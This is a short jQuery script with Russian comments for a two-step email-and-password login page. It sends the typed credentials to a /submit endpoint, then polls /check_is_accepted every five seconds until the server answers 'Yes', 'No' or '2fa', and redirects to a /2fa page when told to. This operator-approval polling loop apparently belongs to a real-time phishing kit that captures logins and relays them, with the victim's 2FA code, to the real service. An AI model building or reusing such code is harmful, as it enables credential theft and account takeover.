$(document).ready(function() {
            
    // Функция для выполнения запроса к серверу
    function checkIsAccepted() {
        $.ajax({
            type: "GET",
            url: "/check_is_accepted",  // Предполагается, что это будет ваш маршрут Flask для проверки значения is_accepted
            success: function(response) {
                console.log(response[0]);
                if (response[0] == "Yes") {
                    // Если значение is_accepted равно 'Yes', перенаправить на одну страницу
                    window.location.href = "/";
                } else if (response[0] == "No") {
                    // Если значение is_accepted равно 'No', перенаправить на другую страницу
                    var element = document.getElementById("typePasswordX-2");
                    element.classList.add("is-invalid");
                } else if (response[0] == "2fa") {
                    // Если значение is_accepted равно '2fa', перенаправить на другую страницу
                    window.location.href = "/2fa";
                } else {
                    // Если значение не 'Yes' или 'No', продолжить опрос через 5 секунд
                    setTimeout(checkIsAccepted, 5000);
                }
            },
            error: function(error) {
                console.error("Ошибка при проверке значения is_accepted");
                setTimeout(checkIsAccepted, 5000);
            }
        });
    }

    $("#email-submit").on("click", function() {
        var email = $("#email").val();
        // Проверка наличия email, можно добавить дополнительные проверки

        // Скрыть форму для email и показать форму для пароля
        $("#email-form").hide();
        $("#password-form").show();
    });

    $("#password-submit").on("click", function() {
        var password = $("#typePasswordX-2").val();
        $("#password-form").hide();
        $("#loading").show();
        // Отправка данных на сервер с использованием AJAX
        $.ajax({
            type: "POST",
            url: "/submit",
            data: {
                email: $("#typeEmailX-2").val(),
                password: password
            },
            success: function(response) {
                // Обработка успешного ответа от сервера
                console.log("Данные успешно отправлены!");
                checkIsAccepted();
            },
            error: function(error) {
                // Обработка ошибки
                console.error("Ошибка отправки данных на сервер");
            }
        });
    });
});